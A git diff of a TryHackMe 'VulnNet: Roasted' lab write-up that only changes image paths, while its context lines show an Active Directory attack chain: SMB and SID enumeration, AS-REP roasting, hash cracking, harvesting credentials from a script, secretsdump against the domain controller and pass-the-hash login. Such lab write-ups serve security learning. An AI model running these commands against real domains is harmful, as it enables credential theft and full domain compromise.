@@ -51,7 +51,7 @@ nmap -sC -sV -T4 -Pn \
 -oN /home/kali/Desktop/THM_LAB/rooms/easy/windows/vulnnet_roasted/scan.txt \
 <TARGET-IP>
 ```
-![nmap](/assets/images/writeups/windows/vulnnet_roasted/1.png)
+![nmap](/assets/images/writeups/thm/windows/vulnnet_roasted/1.png)
 
 ### Why these options?
 
@@ -98,7 +98,7 @@ If the command prompts for a password, try a null password where anonymous acces
 smbclient -L //<TARGET-IP> -N
 ```
 
-![smbclient](/assets/images/writeups/windows/vulnnet_roasted/2.png)
+![smbclient](/assets/images/writeups/thm/windows/vulnnet_roasted/2.png)
 
 ### Why did I try anonymous SMB access?
 
@@ -139,7 +139,7 @@ smb: \> get <filename>
 smb: \> exit
 ```
 
-![smbclient](/assets/images/writeups/windows/vulnnet_roasted/2_0.png)
+![smbclient](/assets/images/writeups/thm/windows/vulnnet_roasted/2_0.png)
 
 The key here was not to assume that every anonymous share contained something useful. I listed the contents and retrieved files that appeared relevant to the organization or its employees.
 
@@ -147,7 +147,7 @@ The key here was not to assume that every anonymous share contained something us
 
 After downloading the enterprise files, I inspected the text files for clues.
 
-![files content](/assets/images/writeups/windows/vulnnet_roasted/2_1.png)
+![files content](/assets/images/writeups/thm/windows/vulnnet_roasted/2_1.png)
 
 From the directory containing those files, I used:
 
@@ -159,7 +159,7 @@ for f in Enterprise-*.txt; do
 done
 ```
 
-![loop files](/assets/images/writeups/windows/vulnnet_roasted/2_2.png)
+![loop files](/assets/images/writeups/thm/windows/vulnnet_roasted/2_2.png)
 
 ### Why use a loop?
 
@@ -187,7 +187,7 @@ impacket-lookupsid -no-pass anonymous@<TARGET-IP>
 
 If the tool reports that anonymous authentication is unavailable, that path has failed and a different permitted enumeration method or discovered credential is needed.
 
-![impacket](/assets/images/writeups/windows/vulnnet_roasted/3.png)
+![impacket](/assets/images/writeups/thm/windows/vulnnet_roasted/3.png)
 
 ### What is a SID?
 
@@ -224,7 +224,7 @@ I saved the relevant usernames into a file.
 ```bash
 nano users.txt
 ```
-![users](/assets/images/writeups/windows/vulnnet_roasted/3_1.png)
+![users](/assets/images/writeups/thm/windows/vulnnet_roasted/3_1.png)
 
 ### Why build a username list?
 
@@ -254,7 +254,7 @@ impacket-GetNPUsers vulnnet-rst.local/ \
 -outputfile asrep_hashes.txt
 ```
 
-![GetNPUsers](/assets/images/writeups/windows/vulnnet_roasted/3_2.png)
+![GetNPUsers](/assets/images/writeups/thm/windows/vulnnet_roasted/3_2.png)
 
 ### Understanding the options
 
@@ -309,14 +309,14 @@ On my machine i got issue with the prefix number before the password string so i
 ```bash
 sed -E 's/^[[:space:]]*[0-9]+[[:space:]]+//' /usr/share/seclists/Passwords/rockyou.txt > rockyou-clean.txt
 ```
-![rockyou-clean](/assets/images/writeups/windows/vulnnet_roasted/rockyou_issue.png)
+![rockyou-clean](/assets/images/writeups/thm/windows/vulnnet_roasted/rockyou_issue.png)
 
 I then checked whether Hashcat had recovered a password:
 
 ```bash
 hashcat -m 18200 asrep_hashes.txt --show
 ```
-![hashcat](/assets/images/writeups/windows/vulnnet_roasted/3_4.png)
+![hashcat](/assets/images/writeups/thm/windows/vulnnet_roasted/3_4.png)
 
 ## Why I also tried John the Ripper
 
@@ -333,7 +333,7 @@ After a successful crack, display the recovered result with:
 ```bash
 john --show asrep_hashes.txt
 ```
-![john](/assets/images/writeups/windows/vulnnet_roasted/3_3.png)
+![john](/assets/images/writeups/thm/windows/vulnnet_roasted/3_3.png)
 
 The recovered credentials were:
 
@@ -368,7 +368,7 @@ nxc smb <TARGET-IP> \
 -p 't<REDACTED>*' \
 --shares
 ```
-![Authenticate](/assets/images/writeups/windows/vulnnet_roasted/3_5.png)
+![Authenticate](/assets/images/writeups/thm/windows/vulnnet_roasted/3_5.png)
 
 ### Why enumerate shares again?
 
@@ -396,7 +396,7 @@ smb: \> get ResetPassword.vbs
 smb: \> exit
 ```
 
-![NETLOGON](/assets/images/writeups/windows/vulnnet_roasted/3_5.1.png)
+![NETLOGON](/assets/images/writeups/thm/windows/vulnnet_roasted/3_5.1.png)
 
 The file `ResetPassword.vbs` was the important discovery.
 
@@ -408,7 +408,7 @@ After downloading the script, I read its contents:
 cat ResetPassword.vbs
 ```
 
-![ResetPassword](/assets/images/writeups/windows/vulnnet_roasted/3_6.png)
+![ResetPassword](/assets/images/writeups/thm/windows/vulnnet_roasted/3_6.png)
 
 The script contained hardcoded credentials. This revealed another account:
 
@@ -438,7 +438,7 @@ nxc smb <TARGET-IP> \
 --shares
 ```
 
-![a-whitehat](/assets/images/writeups/windows/vulnnet_roasted/3_7.png)
+![a-whitehat](/assets/images/writeups/thm/windows/vulnnet_roasted/3_7.png)
 
 This confirmed whether the credentials were valid for SMB on the specified host.
 
@@ -497,7 +497,7 @@ Get-ChildItem -Path C:\ `
 -ErrorAction SilentlyContinue
 ```
 
-![winrm](/assets/images/writeups/windows/vulnnet_roasted/3_8.png)
+![winrm](/assets/images/writeups/thm/windows/vulnnet_roasted/3_8.png)
 
 This command searches recursively under `C:\` for files named `user.txt`.
 
@@ -566,7 +566,7 @@ The next command in my notes was:
 impacket-secretsdump \
 'vulnnet-rst.local/a-whitehat:bNd<REDACTED>ht@<DOMAIN-CONTROLLER-IP>'
 ```
-![secretsdump](/assets/images/writeups/windows/vulnnet_roasted/4.png)
+![secretsdump](/assets/images/writeups/thm/windows/vulnnet_roasted/4.png)
 
 ### What does `secretsdump` do?
 
@@ -614,7 +614,7 @@ evil-winrm -i <DOMAIN-CONTROLLER-IP> \
 -H <ADMINISTRATOR-NTLM-HASH>
 ```
 
-![Administrator](/assets/images/writeups/windows/vulnnet_roasted/4_1.png)
+![Administrator](/assets/images/writeups/thm/windows/vulnnet_roasted/4_1.png)
 
 The `-H` option supplies an NTLM hash instead of a plaintext password.
 
@@ -791,6 +791,6 @@ The attack chain highlights several practical ways to improve Active Directory s
                             v
                       system.txt
 ```
-🖼️ **All process screenshot**![All process screenshot](/assets/images/writeups/windows/vulnnet_roasted/all_process.png)
+🖼️ **All process screenshot**![All process screenshot](/assets/images/writeups/thm/windows/vulnnet_roasted/all_process.png)
 
 *Thanks for reading!*
